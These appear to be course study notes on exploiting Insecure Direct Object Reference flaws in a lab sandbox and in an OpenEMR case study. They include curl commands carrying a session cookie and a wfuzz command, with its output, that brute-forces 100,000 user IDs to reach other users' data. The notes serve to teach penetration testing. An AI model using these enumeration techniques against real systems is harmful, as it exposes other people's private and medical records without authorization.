# Module 15: Insecure Direct Object Referencing

## Introduction to IDOR

### Static File IDOR

<figure><img src="../../../.gitbook/assets/36dc5e7425582420ec799d7bbc850b84-idor_f_landing.png" alt=""><figcaption><p>Static File IDOR Landing Page</p></figcaption></figure>

_Sample routing_

```uri
/users/:userIdent/documents/:pdfFile
/trains/:from-:to
/book/:year-:author
```

_Routed URI Examples_

```uri
/users/18293017/documents/file-15 (PDF Retrieved)
/trains/LVIV-ODESSA               (Ticket File Retrieved)
/book/1996-GeorgeRRMartin         (Book Retrieved)
```

### Database Object Referencing (ID-Based) IDOR

_Example IDOR for a Database Object_

```uri
http://idor-sandbox:80/customerPage/?custId=1
```

## Exploiting IDOR in the Sandbox

### Accessing the IDOR Sandbox Application

_Start the VPN, the VM, and add its IP and hostname to your hosts file._

### Exploiting Static File IDOR

<figure><img src="../../../.gitbook/assets/d0063360d17b2f8871a180a21af6a7d6-idor_sandbox_fileBased_01.png" alt=""><figcaption><p>Click "File-Based IDOR"</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/efc0809121d2f01e6c43512af7fd878c-idor_sandbox_fileBased_02.png" alt=""><figcaption><p>File-Based IDOR URI</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/7e0731fba4b01f63939c9324c9efb12c-idor_sandbox_fileBased_03.png" alt=""><figcaption><p>Contents of the file</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/7a092e4d0d80fe3fead18b3d403746f6-idor_sandbox_fileBased_04.png" alt=""><figcaption><p>Setting ?f=2.txt</p></figcaption></figure>

### Exploiting ID-Based IDOR

<figure><img src="../../../.gitbook/assets/d7555dcc4f8d42ecb39d34c22c345d31-idor_id_based_01.png" alt=""><figcaption><p>ID-Based IDOR</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/3c3ddc006b14e93def60951e18863652-idor_id_based_02.png" alt=""><figcaption><p>The /customerPage/?custId= URI</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/4f893666a8128c25bff36c93a60c1c69-idor_id_based_03.png" alt=""><figcaption><p>The Rendered Content</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/99f53b6c4e19a1244e8b253407317cfd-idor_id_based_04.png" alt=""><figcaption><p>Incrementing the custId Database Parameter by one</p></figcaption></figure>

{% hint style="info" %}
Because we retrieved information through the web browser for a separate user entirely that corresponds with a Customer ID value of "2", we can guess this was the second registered user for the web application.
{% endhint %}

### Exploiting More Complex IDOR

<figure><img src="../../../.gitbook/assets/55ab1c8f01aaf534d3858f3dc7a0b7cd-idor_userexp_login_01.png" alt=""><figcaption><p>Logging in as User Harb</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/6a31e19826228bb2c61917cf07e430a1-idor_sandbox_harb.png" alt=""><figcaption><p>Harb's Data</p></figcaption></figure>

_Gathering Erroneous Response Sizes_

```bash
kali@kali:~$ curl -s http://idor-sandbox:80/user/?uid=62718 -w '%{size_download}'
0
```

We got 0 because we didn't include a valid session ID.

<figure><img src="../../../.gitbook/assets/1cfefbe10d3283544b9bf249e2432f89-idor_userexp_burp_01.png" alt=""><figcaption><p>Gathering a valid session ID</p></figcaption></figure>

_Gathering Erroneous Response Sizes with a Session ID_

{% code overflow="wrap" %}
```bash
kali@kali:~$ curl -s /dev/null http://idor-sandbox:80/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64"
...
2873
```
{% endcode %}

_Fuzzing 100,000 possible UIDs_

{% code overflow="wrap" %}
```bash
kali@kali:~$ wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt --hc 404 --hh 2873 -H "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64" http://idor-sandbox:80/user/?uid=FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://idor-sandbox:80/user/?uid=FUZZ
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000011112:   200        76 L     174 W      2859 Ch     "11111"
000016328:   200        76 L     174 W      2860 Ch     "16327"
000023102:   200        76 L     174 W      2874 Ch     "23101"
000039202:   200        76 L     174 W      2867 Ch     "39201"
000041913:   200        76 L     174 W      2861 Ch     "41912"
000057192:   200        76 L     174 W      2863 Ch     "57191"
000062719:   200        76 L     174 W      2871 Ch     "62718"
000074833:   200        76 L     175 W      2868 Ch     "74832"
000083272:   200        76 L     174 W      2858 Ch     "83271"
000099181:   200        76 L     174 W      2866 Ch     "99180"

Total time: 755.6711
Processed Requests: 100000
Filtered Requests: 99990
Requests/sec.: 132.3327
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/0e7c847870ff31d65d1ba3de6205eec4-user_uid_authenticated_exfil.png" alt=""><figcaption><p>Exfiltrated Data</p></figcaption></figure>

### Extra Miles

_Do the labs._

## Case Study: OpenEMR

### Accessing The OpenEMR Case Study

_Start the VPN, the VM, and add the IP/hostname to your hosts file._

### Discovery of the IDOR Vulnerability

<figure><img src="../../../.gitbook/assets/2cca5f03a25f95d282eb4cd43e32f04e-idor_casestudy_landing.png" alt=""><figcaption><p>OpenEMR Landing Page</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/dfe89f7c9359bea8dd0c2c4da134d6fc-idor_casestudy_login.png" alt=""><figcaption><p>Login form</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/cba22d4064d0a84b8bb97ae899523cb6-idor_casestudy_dashboard.png" alt=""><figcaption><p>Dashboard Panel for OpenEMR</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/20eafc65b8ba90a53865f71c9da11f6a-idor_casestudy_messages_tab_01.png" alt=""><figcaption><p>Message Center - Tab</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/40f4f2d92bcadee5a6a0270ab2f994be-idor_casestudy_messages_tab_02.png" alt=""><figcaption><p>Message Center - Tab Content</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/c50944f5260476a378f081b09b111d42-idor_casestudy_messages_patient_01.png" alt=""><figcaption><p>Individual Patient Messages</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/50766d6d2718704932e67f938724d32e-idor_casestudy_burp_intercept_on.png" alt=""><figcaption><p>Turning on Burp Suite's Intercept Feature</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/033fce8a16b1d53dc2b1465e5c181c37-idor_casestudy_messages_patient_02.png" alt=""><figcaption><p>Clicking Print message</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/20dba4cb6d4eed4a73ce9d7186c91071-idor_casestudy_messages_patient_03.png" alt=""><figcaption><p>Intercepted Request in Burp Suite</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/b38943e58ecdbd1e287ab00307e6d940-idor_casestudy_repeater_01.png" alt=""><figcaption><p>Request in Repeater</p></figcaption></figure>

### Exploiting the IDOR Vulnerability

<figure><img src="../../../.gitbook/assets/2ee6d639bcec5128e7c53a6bc1f37362-idor_casestudy_exp_01.png" alt=""><figcaption><p>Exfiltrated Data for Parameter Value of 11</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/081edff03463438cf67d3448925e4c32-idor_casestudy_exp_02.png" alt=""><figcaption><p>Trying again with a value of 10</p></figcaption></figure>

### Extra Mile

_Do the lab._
